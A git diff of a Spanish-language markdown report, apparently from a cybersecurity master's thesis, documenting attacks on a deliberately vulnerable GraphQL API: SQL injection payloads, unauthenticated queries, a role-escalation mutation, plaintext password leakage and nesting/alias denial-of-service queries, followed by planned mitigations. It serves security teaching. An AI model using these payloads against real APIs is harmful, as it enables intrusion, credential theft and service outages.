@@ -8,7 +8,7 @@ Documentación de vectores de ataque ejecutables contra la API en Fase 1.
 
 ### Ataque en searchUsers
 
-**Query normal:**
+Query normal:
 ```graphql
 query {
   searchUsers(query: "admin") {
@@ -19,7 +19,7 @@ query {
 }
 ```
 
-**Ataque - Bypass de búsqueda:**
+Ataque con bypass de búsqueda:
 ```graphql
 query SQLInjectionUsers {
   searchUsers(query: "' OR '1'='1") {
@@ -31,16 +31,16 @@ query SQLInjectionUsers {
 }
 ```
 
-**SQL ejecutado en backend:**
+SQL ejecutado en backend:
 ```sql
 SELECT * FROM users
 WHERE username LIKE '%' OR '1'='1%'
 OR email LIKE '%' OR '1'='1%'
 ```
 
-**Resultado:** Retorna TODOS los usuarios con sus passwords en texto plano.
+Resultado: Retorna todos los usuarios con sus passwords en texto plano.
 
-**Impacto:**
+Impacto:
 - Bypass completo de autenticación
 - Acceso a todas las credenciales del sistema
 - CVSS 9.8 (Critical)
@@ -49,7 +49,7 @@ OR email LIKE '%' OR '1'='1%'
 
 ### Ataque en searchCVEs
 
-**Ataque - Manipulación de resultados:**
+Ataque con manipulación de resultados:
 ```graphql
 query SQLInjectionCVEs {
   searchCVEs(query: "Windows' OR '1'='1") {
@@ -62,16 +62,16 @@ query SQLInjectionCVEs {
 }
 ```
 
-**SQL ejecutado:**
+SQL ejecutado:
 ```sql
 SELECT * FROM cves
 WHERE title LIKE '%Windows' OR '1'='1%'
 OR description LIKE '%Windows' OR '1'='1%'
 ```
 
-**Resultado:** Retorna TODOS los CVEs independientemente del criterio de búsqueda.
+Resultado: Retorna todos los CVEs independientemente del criterio de búsqueda.
 
-**Impacto:**
+Impacto:
 - El atacante controla la lógica de las queries
 - Puede extraer información sensible
 - CVSS 9.8 (Critical)
@@ -80,9 +80,9 @@ OR description LIKE '%Windows' OR '1'='1%'
 
 ## 2. BROKEN ACCESS CONTROL - Sin Autenticación
 
-**Ataque - Acceso sin credenciales:**
+Ataque con acceso sin credenciales:
 
-Cualquiera puede ejecutar CUALQUIER query o mutation sin proporcionar credenciales.
+Cualquiera puede ejecutar cualquier query o mutation sin proporcionar credenciales.
 ```graphql
 query AccessWithoutAuth {
   users {
@@ -95,7 +95,7 @@ query AccessWithoutAuth {
 }
 ```
 
-**Resultado:**
+Resultado:
 ```json
 {
   "data": {
@@ -112,19 +112,18 @@ query AccessWithoutAuth {
 }
 ```
 
-**Impacto:**
+Impacto:
 - No hay ninguna barrera de entrada al sistema
-- Cualquier persona con acceso a la URL puede leer/modificar datos
+- Cualquier persona con acceso a la URL puede leer y modificar datos
 - CVSS 9.8 (Critical)
 
 ---
 
 ## 3. BROKEN ACCESS CONTROL - Escalación de Privilegios
 
-**Escenario:**
-- Usuario ANALYST (ID: 3) quiere hacerse ADMIN sin autorización
+Escenario: Usuario ANALYST (ID: 3) quiere hacerse ADMIN sin autorización.
 
-**Ataque:**
+Ataque:
 ```graphql
 mutation PrivilegeEscalation {
   updateUserRole(userId: 3, newRole: ADMIN) {
@@ -135,7 +134,7 @@ mutation PrivilegeEscalation {
 }
 ```
 
-**Resultado:**
+Resultado:
 ```json
 {
   "data": {
@@ -148,7 +147,7 @@ mutation PrivilegeEscalation {
 }
 ```
 
-**Impacto:**
+Impacto:
 - Cualquier usuario puede auto-promocionarse a administrador
 - Control de acceso completamente inexistente
 - CVSS 9.8 (Critical)
@@ -157,7 +156,7 @@ mutation PrivilegeEscalation {
 
 ## 4. INFORMATION DISCLOSURE - Passwords en Texto Plano
 
-**Ataque:**
+Ataque:
 ```graphql
 query PasswordLeak {
   users {
@@ -167,7 +166,7 @@ query PasswordLeak {
 }
 ```
 
-**Resultado:**
+Resultado:
 ```json
 {
   "data": {
@@ -189,7 +188,7 @@ query PasswordLeak {
 }
 ```
 
-**Impacto:**
+Impacto:
 - Todas las credenciales visibles en texto plano
 - No hay hashing (BCrypt, Argon2, etc.)
 - El atacante puede hacer login como cualquier usuario
@@ -199,7 +198,7 @@ query PasswordLeak {
 
 ## 5. DENIAL OF SERVICE - Queries Circulares (Deep Nesting)
 
-**Ataque - Consultas profundamente anidadas:**
+Ataque con consultas profundamente anidadas:
 ```graphql
 query CircularDoS {
   products {
@@ -226,19 +225,19 @@ query CircularDoS {
 }
 ```
 
-**Impacto:**
+Impacto:
 - Alto consumo de CPU y memoria del servidor
 - Puede provocar timeout o caída del servicio
 - Afecta a todos los usuarios conectados
 - CVSS 7.5 (High)
 
-**Nota técnica:** La relación bidireccional `Product ↔ Vendor` con `FetchType.EAGER` permite anidación infinita.
+Nota técnica: La relación bidireccional Product ↔ Vendor con FetchType.EAGER permite anidación infinita.
 
 ---
 
 ### Variante: Alias-Based DoS
 
-**Ataque - Multiplicación de queries:**
+Ataque con multiplicación de queries:
 ```graphql
 query AliasDoS {
   u1: users { id username email }
@@ -254,7 +253,7 @@ query AliasDoS {
 }
 ```
 
-**Impacto:**
+Impacto:
 - Una sola petición HTTP ejecuta 10 queries a la base de datos
 - Fácilmente escalable a 100+ aliases
 - Consumo exponencial de recursos
@@ -264,7 +263,7 @@ query AliasDoS {
 
 ## 6. DENIAL OF SERVICE - Sin Paginación
 
-**Ataque - Extracción masiva de datos:**
+Ataque con extracción masiva de datos:
 ```graphql
 query NoPagination {
   users {
@@ -278,60 +277,67 @@ query NoPagination {
 }
 ```
 
-**Impacto:**
-- Si hay 100,000 usuarios, retorna TODOS en una sola response
+Impacto:
+- Si hay 100,000 usuarios, retorna todos en una sola response
 - Consume memoria del servidor y del cliente
 - Ancho de banda desperdiciado
 - Tiempo de respuesta extremadamente alto
 - CVSS 5.3 (Medium)
 
-**Nota:** Sin paginación ni límites (first/after pattern), el sistema no escala.
+Nota: Sin paginación ni límites (first/after pattern), el sistema no escala.
 
 ---
 
-## RESUMEN DE VULNERABILIDADES
+## Resumen de Vulnerabilidades
+```
+#  Vulnerabilidad                Tipo                        Severidad  CVSS
+1  SQL Injection (users)         Injection                   CRITICAL   9.8
+2  SQL Injection (cves)          Injection                   CRITICAL   9.8
+3  Sin Autenticación             Broken Access Control       CRITICAL   9.8
+4  Escalación de Privilegios     Broken Access Control       CRITICAL   9.8
+5  Passwords en Texto Plano      Information Disclosure      CRITICAL   10.0
+6  Queries Circulares DoS        DoS                         HIGH       7.5
+7  Sin Paginación                DoS                         MEDIUM     5.3
+```
 
-| # | Vulnerabilidad | Tipo | Severidad | CVSS | Verificado |
-|---|----------------|------|-----------|------|--------|
-| 1 | SQL Injection (users) | Injection | CRITICAL | 9.8 | OK     |
-| 2 | SQL Injection (cves) | Injection | CRITICAL | 9.8 | OK     |
-| 3 | Sin Autenticación | Broken Access Control | CRITICAL | 9.8 | OK       |
-| 4 | Escalación de Privilegios | Broken Access Control | CRITICAL | 9.8 | OK       |
-| 5 | Passwords en Texto Plano | Information Disclosure | CRITICAL | 10.0 | OK       |
-| 6 | Queries Circulares DoS | DoS | HIGH | 7.5 | OK     |
-| 7 | Sin Paginación | DoS | MEDIUM | 5.3 | OK       |
-
-**Total:** 7 vulnerabilidades demostradas (5 críticas, 1 alta, 1 media)
+Total: 7 vulnerabilidades demostradas (5 críticas, 1 alta, 1 media)  
+CVSS Total: 60.9
 
 ---
 
-## MITIGACIONES (Fase 2)
+## Mitigaciones Planificadas (Fase 2)
 
-En la Fase 2 implementaremos:
+En Fase 2 se implementarán:
 
-1. **SQL Injection**: Usar Panache queries parametrizadas o CriteriaAPI
-2. **Autenticación**: JWT con SmallRye JWT
-3. **Autorización**: `@RolesAllowed` en mutations sensibles
-4. **Passwords**: Hashing con BCrypt (Quarkus Elytron)
-5. **Query Depth**: `quarkus.smallrye-graphql.max-depth=5`
-6. **Query Complexity**: Custom instrumentation
-7. **Paginación**: Implementar patrón cursor-based (first/after)
+**SQL Injection**: Usar Panache queries parametrizadas o CriteriaAPI
+
+**Autenticación**: JWT con SmallRye JWT
+
+**Autorización**: @RolesAllowed en mutations sensibles
+
+**Passwords**: Hashing con BCrypt (Quarkus Elytron)
+
+**Query Depth**: quarkus.smallrye-graphql.max-depth=5
+
+**Query Complexity**: Custom instrumentation
+
+**Paginación**: Implementar patrón cursor-based (first/after)
 
 ---
 
 ## Referencias
 
-- **Black Hat GraphQL** (Dolev Farhi & Nick Aleks, 2023) - Capítulos 4, 5, 6
-- **OWASP API Security Top 10** (2023)
-- **OWASP GraphQL Cheat Sheet**
-- **CWE-89**: SQL Injection
-- **CWE-287**: Improper Authentication
-- **CWE-862**: Missing Authorization
+- Black Hat GraphQL (Dolev Farhi & Nick Aleks, 2023) - Capítulos 4, 5, 6
+- OWASP API Security Top 10 (2023)
+- OWASP GraphQL Cheat Sheet
+- CWE-89: SQL Injection
+- CWE-287: Improper Authentication
+- CWE-862: Missing Authorization
 
 ---
 
-**Autor**: Bladimir Gonzales Miranda  
-**Director**: Rubén Pérez Chacón  
-**TFM**: Seguridad en APIs GraphQL con Quarkus  
-**Universidad**: UNIR - Máster en Ciberseguridad  
-**Fecha**: Noviembre 2024
+Autor: Bladimir Gonzales Miranda  
+Director: Rubén Pérez Chacón  
+TFM: Seguridad en APIs GraphQL con Quarkus  
+Universidad: UNIR - Máster en Ciberseguridad  
+Fecha: Noviembre 2025
